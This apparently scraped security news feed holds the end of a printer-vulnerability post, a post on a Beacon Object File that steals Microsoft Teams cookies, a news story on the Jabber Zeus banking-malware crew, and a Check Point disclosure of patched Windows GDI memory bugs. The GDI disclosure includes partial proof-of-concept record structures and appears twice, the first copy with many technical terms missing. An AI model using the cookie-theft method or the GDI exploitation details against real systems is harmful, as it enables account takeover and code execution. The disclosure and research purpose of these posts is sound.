4. **Isolate printer network**\- Consider placing printers on a separate VLAN
5. **Disable firmware updates over HTTP**\- Use secure update mechanisms only
6. **Monitor printer access logs** for suspicious activity

### For Vendors

1. **Require authentication for SNMP queries**\- Implement SNMPv3 with authentication
2. **Don’t derive passwords from serial numbers**\- Use true random password generation
3. **Require authentication for firmware updates**\- Never allow unauthenticated firmware changes
4. **Implement rollback protection**\- Prevent downgrading to vulnerable firmware versions
5. **Use secure coding practices**\- Implement bounds checking on all string operations
6. **Enable ASLR and DEP**\- Make exploitation more difficult
7. **Implement proper input validation**\- Sanitize all HTTP headers

## Conclusion

This research demonstrates that even seemingly innocuous devices like office printers can harbor serious security vulnerabilities. The chain of vulnerabilities we discovered, from unauthenticated SNMP access to predictable passwords to buffer overflows. It shows how multiple small oversights can combine into a critical security failure.

The broader lesson? **Security cannot be an afterthought in IoT and embedded devices.** Every network-connected device is a potential attack vector, and manufacturers must treat security as a first-class design requirement.

As we continue to connect more devices to our networks, we must remain vigilant about their security posture. That $150 printer might just be the weakest link in your security infrastructure.]]></content:encoded></item><item><title>Steal MS Teams app cookies</title><link>https://tierzerosecurity.co.nz/2025/11/03/teams-cookies-bof.html</link><author>/u/clod81</author><category>netsec</category><pubDate>Sun, 2 Nov 2025 22:31:39 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[
          03 November 2025
          Claudio Contin
        Beacon Object File (BOF) to steal Microsoft Teams cookies
          A research on stealing Microsoft Teams cookies has been recently released: https://blog.randorisec.fr/ms-teams-access-tokens/. The research shows that once the Teams cookies are obtained, these allows to interact with the Teams, Skype and Graph APIs to read and send Teams messages as the victim.
        
          The researcher found that the Microsoft Teams application uses the  (Chromium based process) to embed the browser window within the application. Upon authentication, Teams stores the cookies into a SQLite database, in a similar way as browsers do.
          The main differences between a modern Chromium based browser and Teams is that Chromium enhanced the way they protect the key used to encrypt the cookies, by invoking a COM-based IElevator service running with SYSTEM privileges, rather than simply rely on the current user DPAPI master key. This service checks that the caller is the legitimate browser process by inspecting the executable location is the default secure installation path where low privileged users have no write access by default.
          Instead, the web views for the Teams application still rely on the current user DPAPI master key to encrypt the key used for encryption of the actual cookies. In case of the browser, the only known ways to obtain the state key for cookies encryption is to run within the browser context or by having local administrator/SYSTEM privileges on the host.
        
          The awesome Cookie-Monster-BOF allows to obtain the encryption key and the cookies files while running in the context of a browser process. The tool searches for the right process which has an existing handle opened to the cookies files, invokes the COM service to decrypt the key for cookies encryption, and downloads the cookies file.
        
          The Teams cookies research post mentions the limitation of not being able to read or copy the cookies file, due to being locked by the Teams application while running. When remembering the Cookie-Monster-BOF logic, we thought we could easily repurpose the BOF to target Teams instead. Rather than killing the Teams process, if we are able to run within the process itself (DLL/COM hijack anyone?), we can simply search for the web view child process which has an existing handle open to the cookies file, duplicate it, use it to read the file content and download it, while also decrypting the key used for cookies encryption with the master key of the current user.
        
          Note that in the case of a browser, in order to decrypt the state key, we are forced to operate within the legitimate browser process, due to being otherwise unable to interact with the COM service and decrypt the key.
        
          In the Teams case, this requirement does not apply. The BOF could be run within the context of any processes which run with the same privileges of the Teams process (current user). A process unrelated to Teams which opens handles to the web view Teams child processes, could be seen as an IOC, but technically nothing stops to achieve the same goal. This Gist can be used for this purpose. Note that in this instance, all the web view processes are queried and the cookies file downloaded, including ones unrelated to Teams. The encryption key will only work against the Teams cookies.
        
          The BOF takes no argument and can be run within any C2 that supports BOF.
        
          The decryption logic is 100% the same as per the Cookie-Monster-BOF and remains unchanged.

The gang targeted mostly small to mid-sized businesses, and they were an early pioneer of so-called “man-in-the-browser” attacks, malware that can silently intercept any data that victims submit in a web-based form.Once inside a victim company’s accounts, the Jabber Zeus crew would modify the firm’s payroll to add dozens of “money mules,” people recruited through elaborate work-at-home schemes to handle bank transfers. The mules in turn would forward any stolen payroll deposits — minus their commissions — via wire transfers to other mules in Ukraine and the United Kingdom.The 2012 indictment targeting the Jabber Zeus crew named MrICQ as “,” and said this person handled incoming notifications of newly compromised victims. The Department of Justice (DOJ) said MrICQ also helped the group launder the proceeds of their heists through electronic currency exchange services.Two sources familiar with the Jabber Zeus investigation said Rybtsov was arrested in Italy, although the exact date and circumstances of his arrest remain unclear. A summary of recent decisions (PDF) published by the Italian Supreme Court states that in April 2025, Rybtsov lost a final appeal to avoid extradition to the United States.According to the mugshot website , Rybtsov arrived in Nebraska on October 9, and was being held under an arrest warrant from the U.S. Federal Bureau of Investigation (FBI).The data breach tracking service Constella Intelligence found breached records from the business profiling site bvdinfo[.]com showing that a 41-year-old Yuriy Igorevich Rybtsov worked in a building at 59 Barnaulska St. in Donetsk. Further searching on this address in Constella finds the same apartment building was shared by a business registered to Vyacheslav “Tank” Penchukov, the leader of the Jabber Zeus crew in Ukraine.Vyacheslav “Tank” Penchukov, seen here performing as “DJ Slava Rich” in Ukraine, in an undated photo from social media. is founder of myNetWatchman, a threat intelligence company based in Georgia that began tracking and disrupting the Jabber Zeus gang in 2009. myNetWatchman had secretly gained access to the Jabber chat server used by the Ukrainian hackers, allowing Baldwin to eavesdrop on the daily conversations between MrICQ and other Jabber Zeus members.Baldwin shared those real-time chat records with multiple state and federal law enforcement agencies, and with this reporter. Between 2010 and 2013, I spent several hours each day alerting small businesses across the country that their payroll accounts were about to be drained by these cybercriminals.Those notifications, and Baldwin’s tireless efforts, saved countless would-be victims a great deal of money. In most cases, however, we were already too late. Nevertheless, the pilfered Jabber Zeus group chats provided the basis for dozens of stories published here about small businesses fighting their banks in court over six- and seven-figure financial losses.Baldwin said the Jabber Zeus crew was far ahead of its peers in several respects. For starters, their intercepted chats showed they worked to create a highly customized botnet directly with the author of the original Zeus Trojan — Evgeniy Mikhailovich Bogachev, a Russian man who has long been on the FBI’s “Most Wanted” list. The feds have a standing $3 million reward for information leading to Bogachev’s arrest.Evgeniy M. Bogachev, in undated photos.The core innovation of Jabber Zeus was an alert that MrICQ would receive each time a new victim entered a one-time password code into a phishing page mimicking their financial institution. The gang’s internal name for this component was “,” (the video below from myNetWatchman shows it in action). Jabber Zeus would actually re-write the HTML code as displayed in the victim’s browser, allowing them to intercept any passcodes sent by the victim’s bank for multi-factor authentication.“These guys had compromised such a large number of victims that they were getting buried in a tsunami of stolen banking credentials,” Baldwin told KrebsOnSecurity. “But the whole point of Leprechaun was to isolate the highest-value credentials — the commercial bank accounts with two-factor authentication turned on. They knew these were far juicier targets because they clearly had a lot more money to protect.”Baldwin said the Jabber Zeus trojan also included a custom “backconnect” component that allowed the hackers to relay their bank account takeovers through the victim’s own infected PC.“The Jabber Zeus crew were literally connecting to the victim’s bank account from the victim’s IP address, or from the remote control function and by fully emulating the device,” he said. “That trojan was like a hot knife through butter of what everyone thought was state-of-the-art secure online banking at the time.”Although the Jabber Zeus crew was in direct contact with the Zeus author, the chats intercepted by myNetWatchman show Bogachev frequently ignored the group’s pleas for help. The government says the real leader of the Jabber Zeus crew was , a 38-year Ukrainian man with Russian citizenship who went by the hacker handle “.”Alleged Evil Corp leader Maksim “Aqua” Yakubets. Image: FBIThe Jabber chats intercepted by Baldwin show that Aqua interacted almost daily with MrICQ, Tank and other members of the hacking team, often facilitating the group’s money mule and cashout activities remotely from Russia.The government says Yakubets/Aqua would later emerge as the leader of an elite cybercrime ring of at least 17 hackers that referred to themselves internally as “.” Members of Evil Corp developed and used the  (a.k.a. ) trojan, which helped them siphon more than $100 million from hundreds of victim companies in the United States and Europe.This 2019 story about the government’s $5 million bounty for information leading to Yakubets’s arrest includes excerpts of conversations between Aqua, Tank, Bogachev and other Jabber Zeus crew members discussing stories I’d written about their victims.

We promptly reported these issues to Microsoft, and they were addressed in the  updates in May, July, and August 2025.These are the vulnerabilities:CVE-2025-30388, rated important and considered more likely to be exploited;CVE-2025-53766, classified as critical severity and may allow remote attackers to execute arbitrary code on affected systems;CVE-2025-47984, also rated important and can result in the unauthorized disclosure of sensitive information over the network.Vulnerability disclosures such as these highlight the need for proactive measures to mitigate potential risks. Our purpose in publishing this blog after security fixes were implemented is to further raise awareness of these vulnerabilities and provide Windows users with defensive insights and mitigation recommendations. In the following sections, we detail the findings of our fuzzing campaign, which targeted Windows  using the  format and led to the discovery of these security vulnerabilities.Geometry Gone Rogue – CVE-2025-30388We found three separate crashes related to the processing of ,  and  records. All three cases have a common root cause: another record sets the stage for exploitation. However, the outcome varies depending on which additional records are processed during the execution. Our current analysis focuses on the crash involving the  record.Multiple access violation exceptions occurred in the ScanOperation::AlphaMultiply_sRGB(), ScanOperation::Blend_sRGB_sRGB_MMX() and EpAntialiasedFiller::OutputSpan() functions within version  of the  module. These exceptions were triggered when the system attempted to read or write memory at the end of a  bytes heap block, or while attempting to access reserved but unallocated memory.This vulnerability could potentially allow a remote attacker to perform out-of-bounds read or write memory operations using a specially crafted  metafile.  shows the decompiled source code of the ScanOperation::AlphaMultiply_sRGB() function at the time of the crash. Decompiled source code of the affected ScanOperation::AlphaMultiply_sRGB() function.In our crash sample, which serves as a proof of concept (PoC) for reproducing a vulnerability, an  record is located before the  record within the metafile. This record clears the output coordinate space and initializes it with a background color and transparency, as defined by its  field. The field contains an  object specifying red, green, blue, and alpha components. This detail is significant because it allows an attacker to control the value written to memory during exploitation.  shows the affected  record.EmfPlusClear clear = {
    .Type     = 0x4009,
    .Flags    = 0x0102,
    .Size     = 0x0000003c,
    .DataSize = 0x00000030,
    .Color    = 0xaabbccff  // Value written to memory
};
Listing 1. Sample EmfPlusClear record showing the value written to memory.Further investigation revealed that the  record handler uses the  function to allocate a heap block to store 4000 bytes (0xFA0). This buffer is then populated with the specified  object, which undergoes alpha multiplication by the  function during the processing of the  record.Note that the loop counter stored in the  register begins at 0x950. As each iteration writes a 4-byte object into the target buffer at , the function writes out-of-bounds after 1000 bytes, when the counter reaches 0x567. This behavior can be observed in  which shows an excerpt from the crash analysis.0:000> g

As a result, colors in semi-transparent areas appear darker because these objects emit less light compared to opaque ones.The fourth byte is the alpha value, which can range from 0x00 to 0xFF. Setting the alpha value to 0xFF allows an attacker near-complete control over what is written to the buffer, as the RGB values remain unchanged.

Listing 3. Sample EmfPlusSetTSClip record containing invalid RECT objects.Processing invalid  objects results in a heap-based buffer overflow that may allow an attacker to perform out-of-bounds memory operations. An attacker could exploit this vulnerability by using various other metafile records to write or read memory, as a corrupted  record sets the stage for exploitation. Looking at the rendering of the sample  record in  indicates that it is possible to disclose uninitialized or initialized heap bytes via the filled rectangle. Leaking heap memory in Word via the sample  record.As we can see from the resulting image in Microsoft Word 365, the output varies in each rendering, which demonstrates that this crash sample leaks memory and eventually Word is unexpectedly terminated. This behavior already crosses a security boundary as it can lead to information disclosure if an attacker can read back the rendered image, for example, using JavaScript in a web browser.Microsoft fixed this vulnerability within the  handler function in version 10.0.26100.4061 of  by introducing the  and  functions to validate  objects, as shown in .This bug was addressed with KB5058411 in the  as a remote code execution vulnerability of important severity, tracked as CVE-2025-30388.

Listing 5. Stack trace showing an access violation in the ScanOperation::AlphaDivide_sRGB() function.In a bitmap image, a scan-line is one horizontal row of pixels. Processing an image line by line means handling one scan-line at a time, from left to right and top to bottom. Further analysis showed that the EpScanBitmap::NextBuffer() function never verified that the number of scan-lines it was about to process fit in the destination bitmap, meaning that the function could be tricked into reading or writing past the bottom edge of an image if a call requested more scan-lines than existed.Assuming that the bitmap allocated for thumbnail generation is 100×100 (0x64 × 0x64) pixels, the rectangle data in the PoC metafile deliberately pushes the scan position past the bottom edge of the bitmap and triggers the out-of-bounds write. Any one of those rectangles forces the rasterizer (which converts vector graphics into a pixel grid) to process scan-lines whose Y coordinate is well beyond the 0-99 range of the bitmap.Microsoft fixed this vulnerability within the EpScanBitmap::NextBuffer() function in version 10.0.26100.4946 of , as shown in , by adding a check to detect when the requested number of scan-lines exceeds the height of the bitmap. The function now automatically trims the requested scan-lines to fit within the remaining rows, preventing any out-of-bounds access, as shown in . Decompiled source code of the patched GEpScanBitmap::NextBuffer() function.This vulnerability was addressed with KB5063878 in the August 2025 Patch Tuesday as a critical severity remote code execution vulnerability tracked as CVE-2025-53766. Notably, this vulnerability requires no privileges or user interaction and can be exploited remotely over a network, making it a high-risk threat to web services that parse specially crafted metafiles.Unfinished Business – CVE-2025-48984We identified a fifth crash while processing an  record, which immediately appeared to be related to the CVE-2022-35837 vulnerability.

Listing 6. Stack trace showing an access violation in the StringLengthWorkerW() function.The stack trace suggests that the issue may lie with the  function, which performs a length check on user-controlled data and assumes the input is a null-terminated string. However, if the provided string is not null-terminated, the function may read beyond the allocated buffer, leading to potential information disclosure.The decompiled source code of the  function shown in  demonstrates that CVE-2022-35837 was addressed by assigning values to the  and  fields through a calculated offset stored in the  variable, if their respective fields are non-null. Decompiled source code of the  function. shows the affected  metafile record. The  structure contains the input and output file names and other information used by the  function, which starts a print job.EMR_STARTDOC startDoc = {
    .Type             = 0x0000006b,
    .Size             = 0x0000002c,

Listing 8. Raw EMR_STARTDOC record showing the calculated offsets.The out-of-bounds read occurs because the  function validates string offsets inside the record. A specially crafted metafile may pad the first string in the  field so that it nearly reaches the end of the record. After copying that string, the code advances its internal cursor beyond that point, but the next validation for the  field still treats the supplied offset as if it were relative to the original base of the record.This discrepancy allows an attacker to provide a value that passes the  function while actually pointing outside the heap block. Because no null terminator is found, the  function continues reading into adjacent memory, exposing its contents. The crash sample intensifies the issue by setting the  field to just 0x120 (288) bytes, causing the allocated buffer to be smaller than the embedded data and guaranteeing an over-read.Microsoft fixed this vulnerability within the  handler function in version 10.0.26100.4652 of  by correcting the offset arithmetic. The patched function now converts the pointer back to an offset relative to the start of the record before revalidating it and applies the same logic to the  field. Therefore, the check matches the data that will be dereferenced, as shown in . Decompiled source code of the patched  function.This bug was addressed with KB5062553 in the  as an important severity information disclosure vulnerability tracked as CVE-2025-47984. MSRC classified it as CWE-693: Protection Mechanism Failure, which in this case really means that the security fix to address CVE-2022-35837 was incomplete.We discovered vulnerabilities in Windows  that could have serious implications for system security. Our extensive investigation into  files shows that staying ahead of potential threats requires continuous diligence and adaptation. By sharing these findings, we hope to raise awareness and provide valuable insights and recommendations to enhance security for all Windows users.Security vulnerabilities can persist undetected for years, often resurfacing due to incomplete fixes. A particular information disclosure vulnerability, despite being formally addressed with a security patch, remained active for years due to the original issue receiving only a partial fix. This example underscores a basic conundrum for researchers: introducing a vulnerability is often easy, fixing it can be difficult, and verifying that a fix is both thorough and effective is even more challenging.These issues highlight why comprehensive and continuous security testing, using verification techniques that must be constantly updated and improved, is crucial. This effort can be greatly enhanced by close collaboration between vendors and security researchers, including sharing planned fixes with the researchers who initially reported the issue. Such a collaborative approach adds an extra layer of review, helping to catch potential gaps early and strengthens the overall security of the software ecosystem.]]></content:encoded></item><item><title>Drawn to Danger: Windows Graphics Vulnerabilities Lead to Remote Code Execution and Memory Exposure</title><link>https://research.checkpoint.com/2025/drawn-to-danger-windows-graphics-vulnerabilities-lead-to-remote-code-execution-and-memory-exposure/</link><author>samanthar@checkpoint.com</author><category>vulns</category><pubDate>Sun, 2 Nov 2025 13:53:17 +0000</pubDate><source url="https://0dayfans.com/feed.rss">0dayFans</source><content:encoded><![CDATA[Check Point Research (CPR) identified three security vulnerabilities in the _Graphics Device Interface (_ `GDI`) in Windows. We promptly reported these issues to Microsoft, and they were addressed in the _Patch Tuesday_ updates in May, July, and August 2025.

These are the vulnerabilities:

Vulnerability disclosures such as these highlight the need for proactive measures to mitigate potential risks. Our purpose in publishing this blog after security fixes were implemented is to further raise awareness of these vulnerabilities and provide Windows users with defensive insights and mitigation recommendations. In the following sections, we detail the findings of our fuzzing campaign, which targeted Windows `GDI` using the `EMF` format and led to the discovery of these security vulnerabilities.

We found three separate crashes related to the processing of `EmfPlusDrawString`, `EmfPlusFillRects` and `EmfPlusFillClosedCurve` records. All three cases have a common root cause: another record sets the stage for exploitation. However, the outcome varies depending on which additional records are processed during the execution. Our current analysis focuses on the crash involving the `EmfPlusDrawString` record.

Multiple access violation exceptions occurred in the `ScanOperation::AlphaMultiply_sRGB()`, `ScanOperation::Blend_sRGB_sRGB_MMX()` and `EpAntialiasedFiller::OutputSpan()` functions within version `10.0.26100.3037` of the `GdiPlus.dll` module. These exceptions were triggered when the system attempted to read or write memory at the end of a `4000/0xFA0` bytes heap block, or while attempting to access reserved but unallocated memory.

This vulnerability could potentially allow a remote attacker to perform out-of-bounds read or write memory operations using a specially crafted `EMF+` metafile. _Figure 1_ shows the decompiled source code of the `ScanOperation::AlphaMultiply_sRGB()` function at the time of the crash.

_Figure 1._ Decompiled source code of the affected `ScanOperation::AlphaMultiply_sRGB()` function.

In our crash sample, which serves as a proof of concept (PoC) for reproducing a vulnerability, an `EmfPlusClear` record is located before the `EmfPlusDrawString` record within the metafile. This record clears the output coordinate space and initializes it with a background color and transparency, as defined by its `Color` field. The field contains an `EmfPlusARGB` object specifying red, green, blue, and alpha components. This detail is significant because it allows an attacker to control the value written to memory during exploitation. _Listing 1_ shows the affected `EmfPlusClear` record.

```
EmfPlusClear clear = { .Type = 0x4009, .Flags = 0x0102, .Size = 0x0000003c, .DataSize = 0x00000030, .Color = 0xaabbccff // Value written to memory };
```

Listing 1. Sample EmfPlusClear record showing the value written to memory.

Further investigation revealed that the `EmfPlusClear` record handler uses the `EpScanBitmap::Start()` function to allocate a heap block to store 4000 bytes (0xFA0). This buffer is then populated with the specified `EmfPlusARGB` object, which undergoes alpha multiplication by the `AlphaMultiply_sRGB()` function during the processing of the `EmfPlusDrawString` record.

Note that the loop counter stored in the `ebx` register begins at 0x950. As each iteration writes a 4-byte object into the target buffer at `ecx + edx`, the function writes out-of-bounds after 1000 bytes, when the counter reaches 0x567. This behavior can be observed in _Listing 2_ which shows an excerpt from the crash analysis.
